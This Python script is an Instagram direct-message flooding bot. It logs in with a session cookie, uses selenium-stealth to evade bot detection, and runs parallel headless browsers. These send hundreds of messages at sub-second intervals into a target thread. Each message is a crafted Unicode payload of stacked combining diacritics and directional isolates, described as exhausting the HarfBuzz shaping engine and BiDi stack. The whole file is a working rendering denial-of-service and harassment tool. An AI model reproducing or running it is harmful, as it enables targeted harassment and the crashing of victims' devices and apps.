# -*- coding: utf-8 -*-
# 🚀 PROJECT: PRAVEER.OWNS (LOOP-BYPASS V71)
# 📅 STATUS: ATOMIC-SEND-ACTIVE | 4-AGENT TOTAL | AWS-CPU-TARGET

import os, time, re, random, datetime, threading, sys, gc, tempfile, subprocess, shutil
from concurrent.futures import ThreadPoolExecutor
from selenium import webdriver
from selenium_stealth import stealth
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.options import Options

# --- 4 AGENTS TOTAL CONFIG ---
AGENTS_PER_MACHINE = 2             
TOTAL_DURATION = 25000 
BURST_SPEED = (0.3, 0.8)    # 🛡️ Slightly slower for guaranteed delivery
REST_AFTER_STRIKES = 120   
REST_DURATION = 3          

GLOBAL_SENT = 0
COUNTER_LOCK = threading.Lock()
BROWSER_LAUNCH_LOCK = threading.Lock()

def get_loop_bypass_payload():
    """Generates a payload that targets the HarfBuzz shaping engine and BiDi stack."""
    u_id = random.randint(100, 999)
    # \u2068 = FSI | \u2069 = PDI | \u034F = CGJ
    fsi, pdi, cgj = "\u2068", "\u2069", "\u034F"
    # Overlapping diacritics to exhaust the shaping buffer
    marks = "".join([chr(i) for i in range(0x0300, 0x0345)]) 
    glue = "\u2060"
    
    header = f"👑 PRAVEER PAPA ON TOP 🌙 [LOOP_LOCK:{u_id}]"
    
    body = []
    # 400 lines of mathematically 'Unstable' layout logic
    for i in range(400):
        # We alternate directional isolates to force the CPU to re-check the stack
        line = f"{fsi}P{marks}{cgj}R{marks}{cgj}A{marks}{cgj}V{marks}{cgj}EER{pdi} 🌙 {i}{glue*4}"
        body.append(line)
        
    return f"{header}\n{glue.join(body)}".strip()[:9998]

def get_driver(agent_id):
    with BROWSER_LAUNCH_LOCK:
        chrome_options = Options()
        chrome_options.add_argument("--headless=new") 
        chrome_options.add_argument("--no-sandbox") 
        chrome_options.add_argument("--disable-dev-shm-usage")
        # 🛡️ Keep YOUR bot fast by disabling all rendering
        chrome_options.add_argument("--disable-gpu")
        chrome_options.add_argument("--blink-settings=imagesEnabled=false")
        chrome_options.binary_location = "/usr/bin/google-chrome"
        
        ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36"
        chrome_options.add_argument(f"user-agent={ua}")
        
        driver = webdriver.Chrome(options=chrome_options)
        stealth(driver, languages=["en-US"], vendor="Google Inc.", platform="Win32", fix_hairline=True)
        return driver

def atomic_send(driver, text):
    """Bypasses the UI lag by forcing a direct Socket-level event."""
    try:
        driver.execute_script("""
            var box = document.querySelector('div[role="textbox"], textarea');
            if (box) {
                box.focus();
                // 1. Clear any stuck state
                document.execCommand('selectAll', false, null);
                document.execCommand('delete', false, null);
                // 2. Direct string injection (Bypasses typing animation)
                document.execCommand('insertText', false, arguments[0]);
                
                // 3. Force sync for Instagram's React Framework
                box.dispatchEvent(new Event('input', { bubbles: true }));
                
                // 4. Force immediate Enter dispatch
                var e = new KeyboardEvent('keydown', {
                    key: 'Enter', code: 'Enter', keyCode: 13, which: 13, 
                    bubbles: true, cancelable: true
                });
                box.dispatchEvent(e);
            }
        """, text)
        return True
    except: return False

def run_life_cycle(agent_id, cookie, target):
    while True:
        try:
            driver = get_driver(agent_id)
            driver.get("https://www.instagram.com/")
            driver.add_cookie({'name': 'sessionid', 'value': cookie.strip(), 'path': '/', 'domain': '.instagram.com'})
            driver.get(f"https://www.instagram.com/direct/t/{target}/")
            time.sleep(12) 
            
            strike_count = 0
            while True:
                payload = get_loop_bypass_payload()
                if atomic_send(driver, payload):
                    strike_count += 1
                    with COUNTER_LOCK:
                        global GLOBAL_SENT
                        GLOBAL_SENT += 1
                    print(f"Agent {agent_id}: Atomic-Strike ({GLOBAL_SENT})")
                    
                    if strike_count % 80 == 0:
                        driver.refresh()
                        time.sleep(5)
                time.sleep(random.uniform(*BURST_SPEED))
        except: pass
        finally:
            try: driver.quit()
            except: pass
            time.sleep(2)

def main():
    cookie = os.environ.get("INSTA_COOKIE", "").strip()
    target = os.environ.get("TARGET_THREAD_ID", "").strip()
    with ThreadPoolExecutor(max_workers=AGENTS_PER_MACHINE) as executor:
        for i in range(AGENTS_PER_MACHINE):
            executor.submit(run_life_cycle, i+1, cookie, target)

if __name__ == "__main__":
    main()
